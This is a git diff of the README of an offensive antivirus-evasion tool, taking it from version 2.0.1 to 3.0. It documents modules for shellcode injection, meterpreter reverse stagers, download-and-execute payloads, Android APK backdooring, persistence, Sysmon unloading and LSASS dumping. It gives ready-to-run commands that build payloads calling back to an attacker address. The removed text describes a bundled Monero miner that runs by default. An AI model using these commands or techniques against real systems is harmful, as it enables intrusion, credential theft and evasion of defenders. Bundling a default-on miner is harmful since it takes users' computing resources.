@@ -1,63 +1,29 @@
 # PHANTOM EVASION 3.0
 
-Major update incoming in the next 3 days (approx.)
-
-# PHANTOM EVASION 2.0.1
-
-Phantom-Evasion is an interactive antivirus evasion tool written in python capable to generate (almost) FUD executable even with the most common 32 bit msfvenom payload (lower detection ratio with 64 bit payloads).
-The aim of this tool is to make antivirus evasion an easy task for pentesters through the use of modules focused on polymorphic code and antivirus sandbox detection techniques.
-Since version 1.0 Phantom-Evasion also include a post-exploitation section dedicated to persistence and auxiliary modules.
-
+Phantom-Evasion is an antivirus evasion tool written in python (both compatible with python and python3) capable to generate (almost) fully undetectable executable even with the most common x86 msfvenom payload.
 
 The following OSs officialy support automatic setup:
 
-1. Kali Linux Rolling 2018.1+   (64 bit)
+1. Kali Linux                   (64 bit)
 2. Parrot Security              (64 bit)
+3. Osx (tested on Catalina)     (64 bit)
 
-The following OSs are likely able to run Phantom Evasion through manual setup:
+The following OSs likely support automatic setup but require manual installation of metasploit-framework:
 
-1. Arch Linux                   (64 bit)
-2. BlackArch Linux              (64 bit)
-3. Elementary                   (64 bit)
-4. Linux Mint                   (64 bit)
-5. Ubuntu 15.10+                (64 bit)
-6. Windows 7/8/10               (64 bit)
- 
-## Version 2.0.1 released!
+1. Linux distro
 
-New features:
+The following OSs require manual setup:
 
--Process Inject (PEinject) modules
-
--Thread Execution Hijack modules
-
--Pure C meterpreter reverse https stager (x86/x64)
-
--Non-staged msfvenom payload support
-
--Multibyte xor with progressive key-lenght
-
--Online certificate spoofer & Exe signer
-
-## Contributors
-
-Special thanks to:
-
-phra https://github.com/phra
-
-stefano118 https://github.com/stefano118
-
-## Getting Started
+1. Windows 10                   (64 bit)
 
 Simply git clone or download and unzip Phantom-Evasion folder
 
-## Kali Linux:
+## Setup:
 
-Automatic setup officially supported, open a terminal and execute phantom-evasion:
-
+Automatic setup, open a terminal and execute:
 
 ```
-sudo python phantom-evasion.py 
+sudo python3 phantom-evasion.py --setup
 ```
 
 or:
@@ -65,290 +31,246 @@ or:
 ```
 sudo chmod +x ./phantom-evasion.py
 
-sudo ./phantom-evasion.py
+sudo ./phantom-evasion.py --setup
 ```
+or start phantom-evasion in interactive mode and select option 7 
 
 ## Dependencies (only for manual setup)
 
 1. metasploit-framework
 2. mingw-w64 (cygwin on windows)
-3. gcc
+3. gcc-multilib
 4. apktool
-5. strip
-6. wine (not necessary on windows)
-7. apksigner
-8. pyinstaller
+5. apksigner
+6. strip
+7. osslsigncode
 
+## CMDLINE/INTERACTIVE:
 
-require libc6-dev-i386 (linux only)
+1. Launch phantom-evasion in interactive mode:
 
-## WINDOWS PAYLOADS
+```
+sudo python3 phantom-evasion.py
+```
+or:
 
-## Windows Shellcode Injection Modules (C)
+```
+sudo ./phantom-evasion.py
+```
 
-Msfvenom windows payloads and custom shellcodes supported
+2. Otherwise to see cmdline mode options:
 
-(>) Randomized junkcode and windows antivirus evasion techniques
+```
+sudo python3 phantom-evasion.py --help
+```
+or:
 
-(>) Multibyte Xor encoders availables (see Multibyte Xor encoders readme section)
+```
+sudo ./phantom-evasion.py --help
+```
+## WINDOWS Modules
 
-(>) Decoy Processes Spawner available (see Decoy Process Spawner section)
+-All windows payload C modules and can be compiled (support both x86 and x64) as EXE or DLL/ReflectiveDLL.
+-Randomized junkcode injection (intensity,frequency and reinjection probability can be set) and windows antivirus evasion techniques (frequency can be set).
+-Multibyte Xor/Vigenere shellcode/file encryption supported in both Shellcode injection and Donwload Exec modules.
+-Ntdll unhookapi and Peb process masquerading technique supported.
+-Wide range of execution mode supported (both local and remote).
+-Wide range of payload memory allocation mode(Virtual_RWX,Virtual_RW/RX,Virtual_RW/RWX,Heap_RWX).
+-Dynamic loading of Windows api can be set.
+-Certificate spoofer and signer supported.
+-Strip executable (https://en.wikipedia.org/wiki/Strip_(Unix))
 
-(>) Strip executable available (https://en.wikipedia.org/wiki/Strip_(Unix))
+## Windows C Shellcode Injection 
 
-(>) Execution time range:35-60 second
+Msfvenom windows payloads and custom shellcode supported.
+Shellcode can be stored as resource and retrieved at runtime with FindResource API.
 
-1) Windows Shellcode Injection VirtualAlloc:
-Inject and Execute shellcode in memory using VirtualAlloc,CreateThread,WaitForSingleObject API.
+Shellcode Encryption supported: 1.none
+                                2.Multibyte-Xor
+                                3.Double-key Multibyte-Xor
+                                4.Vigenere
+                                5.Double-key Vigenere
 
-2) Windows Shellcode Injection VirtualAlloc NoDirectCall LL/GPA:
-Inject and Execute shellcode in memory using VirtualAlloc,CreateThread,WaitForSingleObject API.
-Critical API are dinamically loaded (No Direct Call) using LoadLibrary and GetProcAddress API.  
+1. Local exec method can be one of the following:  Thread (shorten is T)
+                                                   APC    
 
-3) Windows Shellcode Injection VirtualAlloc NoDirectCall GPA/GMH:
-Inject and Execute shellcode in memory using VirtualAlloc,CreateThread,WaitForSingleObject API.
-Critical API are dinamically loaded (No Direct Call) using GetModuleHandle and GetProcAddress API.  
+   Local Memory allocation mode can be one of the following: Virtual_RWX
+                                                             Virtual_RW/RX
+                                                             Virtual_RW/RWX
+                                                             Heap_RWX
 
-4) Windows Shellcode Injection HeapAlloc:
-Inject and Execute shellcode in memory using HeapAlloc,HeapCreate,CreateThread,WaitForSingleObject API.
+2. Remote exec method can be one of the following: ThreadExecutionHijack (shorten is TEH)
+                                                   Processinject         (shorten is PI)
+                                                   APCSpray              (shorten is APCS)
+                                                   EarlyBird             (shorten is EB)
+                                                   EntryPointHijack      (shorten is EPH) 
 
-5) Windows Shellcode Injection HeapAlloc NoDirectCall LL/GPA:
-Inject and Execute shellcode in memory using HeapCreate,HeapAlloc,CreateThread,WaitForSingleObject API.
-Critical API are dinamically loaded (No Direct Call) using LoadLibrary and GetProcAddress API. 
+   Remote Memory allocation mode can be one of the following: Virtual_RWX
+                                                              Virtual_RW/RX
+                                                              Virtual_RW/RWX
+                                                                                   
 
-6) Windows Shellcode Injection HeapAlloc NoDirectCall GPA/GMH:
-Inject and Execute shellcode in memory using HeapCreate,HeapAlloc,CreateThread,WaitForSingleObject API.
-Critical API are dinamically loaded (No Direct Call) using GetModuleHandle and GetProcAddress API.  
+## Windows Pure C meterpreter stager (C)
 
-7) Windows Shellcode Injection Process inject:
-Inject and Execute shellcode into remote process memory (default: OneDrive.exe (x86) , explorer.exe (x64)) using VirtualAllocEx,WriteProcessMemory,CreateRemoteThread,WaitForSingleObject API.
+Pure C meterpreter stager (TCP/HTTP/HTTPS) modules compatible with msfconsole and cobalt strike beacon. (reverse_tcp/reverse_http/reverse_https) 
 
-8) Windows Shellcode Injection Process inject NoDirectCall LL/GPA:
-Inject and Execute shellcode into remote process memory (default: OneDrive.exe (x86) , explorer.exe (x64)) using VirtualAllocEx,WriteProcessMemory,CreateRemoteThread,WaitForSingleObject API.
-Critical API are dinamically loaded (No Direct Call) using LoadLibrary and GetProcAddress API.
+Using cmdline mode:
+    reverse_tcp c stager is WRT
+    reverse_http c stager is WRH
+    reverse_https c stager is WRS
 
-9) Windows Shellcode Injection Process inject NoDirectCall GPA/GMH:
-Inject and Execute shellcode into remote process memory (default: OneDrive.exe (x86) , explorer.exe (x64)) using VirtualAllocEx,WriteProcessMemory,CreateRemoteThread,WaitForSingleObject API.
-Critical API are dinamically loaded (No Direct Call) using GetModuleHandle and GetProcAddress API.
+1. Local exec method can be one of the following:  Thread (shorten is T)
+                                                   APC    
 
-10) Windows Shellcode Injection Thread Hijack:
-Inject shellcode into remote process memory and execute it performing thread execution hijack (default: OneDrive.exe (x86) , explorer.exe (x64)) using VirtualAllocEx,WriteProcessMemory,Get/SetThreadContext,Suspend/ResumeThread API.
+   Local Memory allocation mode can be one of the following: Virtual_RWX
+                                                             Virtual_RW/RX
+                                                             Virtual_RW/RWX
+                                                             Heap_RWX
 
-11) Windows Shellcode Injection Thread Hijack LL/GPA:
-Inject shellcode into remote process memory and execute it performing thread execution hijack (default: OneDrive.exe (x86) , explorer.exe (x64)) using VirtualAllocEx,WriteProcessMemory,Get/SetThreadContext,Suspend/ResumeThread API.
-Critical API are dinamically loaded (No Direct Call) using LoadLibrary and GetProcAddress API.
+## Windows C Download-Exec NoDiskWrite
 
-12) Windows Shellcode Injection Thread Hijack GPA/GMH:
-Inject shellcode into remote process memory and execute it performing thread execution hijack (default: OneDrive.exe (x86) , explorer.exe (x64)) using VirtualAllocEx,WriteProcessMemory,Get/SetThreadContext,Suspend/ResumeThread API.
-Critical API are dinamically loaded (No Direct Call) using GetModuleHandle and GetProcAddress API.
+Download exe/dll from supplied url in memory and execute/load into remote process (without writing on disk).
 
-## Windows Pure C meterpreter stager
+EXE/DLL Encrypted Download supported: 1.none
+                                      2.Multibyte-Xor
+                                      3.Double-key Multibyte-Xor
+                                      4.Vigenere
+                                      5.Double-key Vigenere
 
-Pure C polymorphic meterpreter stagers compatible with msfconsole and cobalt strike beacon.(reverse_tcp/reverse_http) 
+The Encrypted DLL/EXE will be saved as originalfilename + "crypt" + ".dll" or ".exe" this is the one to be download if using
 
-(>) Randomized junkcode and windows antivirus evasion techniques
-(>) Phantom evasion decoy process spawner available (see phantom evasion decoy process spawner section)
-(>) Strip executable available (https://en.wikipedia.org/wiki/Strip_(Unix))
-(>) Execution time range:35-60 second
+1. Windows DownloadExecExe NoDiskWrite (WDE using cmdline mode):
 
+   Remote exec method can be one of the following: ProcessHollowing (shorten is PH)
+                                                   Chimera          (shorten is C)
 
-1) C meterpreter/reverse_TCP VirtualAlloc (x86/x64):
-32/64 bit windows/meterpreter/reverse_tcp polymorphic stager written in c (require multi/handler listener with payload set to windows/meterpreter/reverse_tcp (if x86) -- windows/x64/meterpreter/reverse_tcp (if x64) , memory:Virtual)
+2. Windows DownloadExecDll NoDiskWrite (WDD using cmdline mode):
 
-2) C meterpreter/reverse_TCP HeapAlloc (x86/x64):
-32/64 bit windows/meterpreter/reverse_tcp polymorphic stager written in c (require multi/handler listener with payload set to windows/meterpreter/reverse_tcp (if x86) -- windows/x64/meterpreter/reverse_tcp (if x64) , memory:Heap) 
-
-3) C meterpreter/reverse_TCP VirtualAlloc NoDirectCall GPAGMH  (x86/x64):
-32/64 bit windows/meterpreter/reverse_tcp polymorphic stager written in c (rrequire multi/handler listener with payload set to windows/meterpreter/reverse_tcp (if x86) -- windows/x64/meterpreter/reverse_tcp (if x64) , memory:Virtual , API loaded at runtime)
-
-4) C meterpreter/reverse_TCP HeapAlloc NoDirectCall GPAGMH (x86/x64):
-32/64 bit windows/meterpreter/reverse_tcp polymorphic stager written in c (require multi/handler listener with payload set to windows/meterpreter/reverse_tcp (if x86) -- windows/x64/meterpreter/reverse_tcp (if x64) , memory:Heap , API loaded at runtime) 
-
-5) C meterpreter/reverse_HTTP VirtualAlloc (x86/x64):
-32/64 bit windows/meterpreter/reverse_http polymorphic stager written in c (require multi/handler listener with payload set to windows/meterpreter/reverse_http (if x86) -- windows/x64/meterpreter/reverse_http (if x64) , memory:Virtual)
-
-6) C meterpreter/reverse_HTTP HeapAlloc (x86/x64):
-32/64 bit windows/meterpreter/reverse_http polymorphic stager written in c (require multi/handler listener with payload set to windows/meterpreter/reverse_http (if x86) -- windows/x64/meterpreter/reverse_http (if x64) , memory:Heap) 
-
-7) C meterpreter/reverse_HTTP VirtualAlloc NoDirectCall GPAGMH  (x86/x64):
-32/64 bit windows/meterpreter/reverse_http polymorphic stager written in c (require multi/handler listener with payload set to windows/meterpreter/reverse_http (if x86) -- windows/x64/meterpreter/reverse_http (if x64) , API loaded at runtime)
-
-8) C meterpreter/reverse_HTTP HeapAlloc NoDirectCall GPAGMH (x86/x64):
-32/64 bit windows/meterpreter/reverse_http polymorphic stager written in c (require multi/handler listener with payload set to windows/meterpreter/reverse_http (if x86) -- windows/x64/meterpreter/reverse_http (if x64) , memory:Heap , API loaded at runtime)
-
-9) C meterpreter/reverse_HTTPS VirtualAlloc (x86/x64):
-32/64 bit windows/meterpreter/reverse_http polymorphic stager written in c (require multi/handler listener with payload set to windows/meterpreter/reverse_https (if x86) -- windows/x64/meterpreter/reverse_https (if x64) , memory:Virtual)
-
-10) C meterpreter/reverse_HTTPS HeapAlloc (x86/x64):
-32/64 bit windows/meterpreter/reverse_http polymorphic stager written in c (require multi/handler listener with payload set to windows/meterpreter/reverse_https (if x86) -- windows/x64/meterpreter/reverse_https (if x64) , memory:Heap) 
-
-11) C meterpreter/reverse_HTTPS VirtualAlloc NoDirectCall GPAGMH  (x86/x64):
-32/64 bit windows/meterpreter/reverse_http polymorphic stager written in c (require multi/handler listener with payload set to windows/meterpreter/reverse_https (if x86) -- windows/x64/meterpreter/reverse_https (if x64) , API loaded at runtime)
-
-12) C meterpreter/reverse_HTTPS HeapAlloc NoDirectCall GPAGMH (x86/x64):
-32/64 bit windows/meterpreter/reverse_http polymorphic stager written in c (require multi/handler listener with payload set to windows/meterpreter/reverse_https (if x86) -- windows/x64/meterpreter/reverse_https (if x64) , memory:Heap , API loaded at runtime)
-
-
-## Powershell / Wine-Pyinstaller modules 
-
-Powershell modules:
-
-(>) Randomized junkcode and windows antivirus evasion techniques
-(>) Decoy Process Spawner available (see phantom evasion decoy process spawner section)
-(>) Strip executable available (https://en.wikipedia.org/wiki/Strip_(Unix))
-(>) Execution time range:35-60 second
-
-1) Windows Powershell/Cmd Oneliner Dropper:
-Require user-supplied Powershell/Cmd oneliner payload (example Empire oneliner payload). 
-Generate Windows powershell/Cmd oneliner dropper written in c.
-Powershell/Cmd oneliner payload is executed using system() function.
-
-
-2) Windows Powershell Script Dropper:
-Both msfvenom and custom powershell payloads supported.
-(32 bit powershell payloads are not compatible with 64 bit powershell target and vice versa.)
-Generate Windows powershell script (.ps1) dropper written in c.
-Powershell script payload is executed using system() function 
-(powershell -executionpolicy bypass -WindowStyle Hidden -Noexit -File "PathTops1script").
-
-Wine-Pyinstaller modules:
-
-(>) Randomized junkcode and windows antivirus evasion techniques
-(>) Execution time range:5-25 second
-(>) Require python and pyinstaller installed in wine.
-
-3) Windows WinePyinstaller Python Meterpreter
-
-Pure python meterpreter payload.  
-
-4)  WinePyinstaller Oneline payload dropper
-
-Pure python powershell/cmd oneliner dropper.
-
-Powershell/cmd payload executed using os.system().
-
+   Remote loading method can be one of the following: ReflectiveDll    (shorten is RD)
+                                                      RDAPC            (ReflectiveDllAPC)
+                                                      ManualMap        (shorten is MM) ---> only x86
+                                                      
 ## LINUX PAYLOADS
 
 ## Linux Shellcode Injection Module (C)
 
 Msfvenom linux payloads and custom shellcodes supported.
 
-(>) Randomized junkcode and C antivirus evasion techniques
-(>) Multibyte Xor encoders availables (see Multibyte Xor encoders readme section)
-(>) Strip executable available (https://en.wikipedia.org/wiki/Strip_(Unix))
-(>) Execution time range:20-45 second
-
-1) Linux Shellcode Injection HeapAlloc:
-Inject and Execute shellcode in memory using mmap and memcpy.
-
-2) Linux Bash Oneliner Dropper:
-Execute custom oneliner payload using system() function.
-
-## OSX PAYLOADS
-
-1) OSX 32bit multi-encoded:
-
-Pure msfvenom multi-encoded OSX payloads.
-
 ## ANDROID PAYLOADS
 
-1) Android Msfvenom Apk smali/baksmali:
+1. Android Msfvenom Obfuscate Backdoor:
 
-(>) Fake loop injection
-(>) Goto loop
+    Obfuscate msfvenom payloads an rebuild (smali/baksmali) with apktool.
+    Obfuscated payload can be used to backdoor benign apk files.
+             
+## PERSISTENCE Modules
 
-Android msfvenom payloads modified an rebuilded with apktool (Also capable of apk backdoor injection). 
+1. Windows Persistence RegCreateKeyExW Add Registry Key  (C)
+    Compiled executable need to be uploaded to the target machine and excuted specifing the fullpath to file to add to startup as argument.
 
-## UNIVERSAL PAYLOADS
-
-Generate executable compatible with the OSs used to run Phantom-Evasion.
-
-1) Universal Meterpreter increments-trick
-
-2) Universal Polymorphic Meterpreter 
-
-3) Universal Polymorphic Oneliner dropper                  
-
-## POST-EXPLOITATION MODULES
-
-1) Windows Persistence RegCreateKeyExW Add Registry Key  (C)
-This modules generate executables which needs to be uploaded to the target machine and excuted specifing the fullpath to file to add to startup as arguments.
-
-2) Windows Persistence REG Add Registry Key (CMD)
-This module generate persistence cmdline payloads (Add Registry Key via REG.exe).  
+2. Windows Persistence REG Add Registry Key (CMD)
+    This module generate persistence cmdline payloads (Add Registry Key via REG.exe).  
     
-3) Windows Persistence Keep Process Alive
-This module generate executable which need to be uploaded to the target machine and executed.
-Use CreateToolSnapshoot ProcessFirst and ProcessNext to check if specified process is alive every X seconds.
-Usefull combined with Persistence N.1 or N.2 (persistence start Keep process alive file which then start and keep alive the specified process)
+3. Windows Persistence Keep Process Alive (C)
+    Compiled executable need to be uploaded to the target machine and executed.
+    Use CreateToolSnapshoot ProcessFirst and ProcessNext to check if specified process is alive every X seconds.
+    Usefull combined with Persistence N.1 or N.2 (persistence start Keep process alive file which then start and keep alive the specified process)
 
-4) Windows Persistence Schtasks cmdline
+4. Windows Persistence Schtasks (CMD)
 
-This modules generate persistence cmdline payloads (using Schtasks.exe).
+    This module generate persistence cmdline payloads (using Schtasks.exe).
 
-5) Windows Set Files Attribute Hidden
+5. Windows Persistence Create Service (CMD)
 
-hide file through commandline or with compiled executable (SetFileAttributes API)   
- 
-## Warning
+    This module generate persistence cmdline payloads (using sc.exe).
 
-PYTHON3 COMPATIBILITY TEMPORARILY SUSPENDED!
+## PRIVILEGE ESCALATION Modules
 
-## Decoy Processes Spawner:
+1. Windows DuplicateTokenEx (C)
 
-During target-side execution this will cause to spawn (Using WinExec or CreateProcess API) a maximum of 4 processes
-consequentialy.
-The last spawned process will reach the malicious section of code while the other decoy processes spawned before will executes only random junk code.
+    Compiled executable need to be uploaded to the target machine and executed.
 
-PRO: Longer execution time,Lower rate of detection.
-CONS: Higher resource consumption.
+## POSTEXPLOITATION Modules
 
-## Multibyte Xor Encoder:
+1. Windows Unload Sysmon (C)
 
-C xor encoders with three pure c decoding stub available with Shellcode Injection modules.
+    Compiled executable need to be uploaded to the target machine and executed.
 
-1. MultibyteKey xor:
+2. Windows Unload Sysmon (CMD)
 
-Shellcode xored with one multibyte (variable lenght) random key.
-Polymorphic C decoder stub. 
-           
-2. Double Multibyte-key xor:
+3. Windows Attrib hide file (CMD)
 
-Shellcode xored with the result of xor between two multibyte (variable lenght) random keys
-Polymorphic C decoder stub.
-      
-3. Triple Multibyte-key xor:
+    Use attrib to hide file    
 
-Shellcode xored with the result of xor between two multibyte (variable lenght) random keys xored with a third multibyte random key.
-Polymorphic C decoder stub.
+4. Windows SetFileAttribute hidden (C)
 
+    Compiled executable need to be uploaded to the target machine and executed.
+    hide file using SetFileAttributes API
+
+5. Windows DumpLsass (C)
+
+    Compiled executable need to be uploaded to the target machine and executed.
+    Dump Lsass using MiniWriteDumpWrite API.
+
+6. Windows DumpLsass (CMD)
+
+    Dump Lsass from cmdline.
+
+## Phantom-Evasion Cmdline mode examples:
+
+1. windows shellcode injection, local execution method: Thread, mem: Virtual_RWX , encryption: vigenere
+
+```
+python3 phantom-evasion.py -m WSI -msfp windows/meterpreter/reverse_tcp -H 192.168.1.123 -P 4444 -i Thread -e 4 -mem Virtual_RWX -j 1 -J 15 -jr 0 -E 5 -f exe -o filename.exe
+```
+
+2. windows x64 shellcode injection ,output as reflective dll ,remote execution method: ProcessInject (PI), mem: Virtual_RW/RX , target process: SkypeApp.exe ,encryption: double key xor
+
+```
+python3 phantom-evasion.py -m WSI -msfp windows/x64/meterpreter/reverse_tcp -a x64 -H 192.168.1.123 -P 4444 -tp SkypeApp.exe -i PI -e 3 -mem Virtual_RW/RX -j 1 -J 15 -jr 0 -E 5 -f dll -R -o filename.dll
+```
+
+3. windows x64 shellcode injection ,output as stripped dll, shellcode stored as resource, remote execution method: EarlyBird (EB) , mem: Virtual_RW/RX , target process: svchost.exe ,encryption: xor
+
+```
+python3 phantom-evasion.py -m WSI -msfp windows/x64/meterpreter/reverse_tcp -a x64 -H 192.168.1.123 -P 4444 -tp svchost.exe -i EB -e 2 -mem Virtual_RW/RX -j 1 -J 15 -jr 0 -E 5 -f dll -res -S -o filename.dll
+```
+
+4. windows x64 reverse https stager ,output as stripped dll,local execution method: Thread , mem: Heap_RWX
+
+```
+python3 phantom-evasion.py -m WRS -a x64 -H 192.168.1.123 -P 4444 -i Thread -mem Heap_RWX -j 1 -J 15 -jr 0 -E 5 -f dll -S -o filename.dll
+```
+
+5. windows x86 downloadexec dll ,output as stripped exe ,remote execution method: ManualMap (MM), target process: OneDrive.exe ,downloadsize 1000000 bytes 
+
+```
+python3 phantom-evasion.py -m WDD -U http://192.168.1.123/payload.dll -i MM -tp OneDrive.exe -ds 1000000  -j 10 -J 10 -jr 0 -E 10 -f exe -S -o filename.exe
+
+```
+
+6. windows x64 downloadexec exe ,output as stripped reflective dll,remote execution method: ProcessHollowing (PH), target process: svchost.exe ,downloadsize 1000000 bytes 
+
+```
+python3 phantom-evasion.py -m WDE -U http://192.168.1.123/payloadcrypt.exe -e 4 -ef payload.exe -i PH -tp svchost.exe -ds 1000000  -j 1 -J 5 -jr 0 -E 3 -f dll -R -S -o filename.dll
+
+```
 
 ## License
 
 GPLv3.0
 
+## Credits and usefull resources
 
-## Donate
+https://github.com/stephenfewer/ReflectiveDLLInjection
 
-In order to support the developer of this tool, you can help out by allowing phantom-evasion to install a Monero Miner along side the program's main functionality. The miner will be configured to use a low amount of system resources during phantom-evasion execution and can be deactivated at any time should you wish to do so.
-The miner (xmr-stak) is in low power comsumption mode and will use half threads detected
-You can turn it off opening another terminal then type:
-```
-Tmux attach
-```
-Then press ctrl-c
+https://github.com/rsmudge/metasploit-loader
 
-You can also turn it off by default editing Config.txt file inside Setup folder
-Then
-Simply setting: Mining = False
+https://ired.team/offensive-security/privilege-escalation/t1134-access-token-manipulation
 
-Would you like to see mining stats?
+https://ired.team/offensive-security/defense-evasion/unloading-sysmon-driver
 
-Go to MoneroOcean webpage and insert this xmr wallet address:
-```
-474DTYXuUvKPt4uZm6aHoB7hPY3afNGT1A3opgv9ervJWph7e2NQGbU9ALS2VfZVEgKYwgUp7z8PxPx2u2CAqusPJgxaiXy
-```
-to see your miner stats check the random username generated inside Setup/Config.txt
+https://ired.team/offensive-security/code-injection-process-injection/loading-and-executing-shellcode-from-portable-executable-resources
 
-
+https://github.com/theevilbit/injection
 
